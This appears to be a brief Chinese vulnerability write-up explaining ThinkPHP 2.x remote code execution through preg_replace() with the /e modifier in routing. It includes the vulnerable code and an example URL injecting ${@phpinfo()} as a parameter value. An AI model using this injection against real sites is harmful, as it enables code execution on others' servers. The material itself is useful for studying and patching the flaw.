2.x 版本采取`preg_replace()`的/e模式去处理路由
`$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));`

控制器`IndexAction`类  
```
<?php                                                    class IndexAction extends Action{       
    public function index() {        
        $this>assign('hello','Hello,ThinkPHP');                                            $this->display();                                                         
    }            
}                                         
?>
```
对于路由
`http://xi4ao.com/?s=/IndexAction/index/payload/${@phpinfo()}`
取`IndexAction`作为控制类，取`index`作为调用函数
取`payload`作为键，取`${@phpinfo()}`作为值，传入控制类函数作为参数。
而在`/e`模式下，会将`${@phpinfo()}`当命令执行。
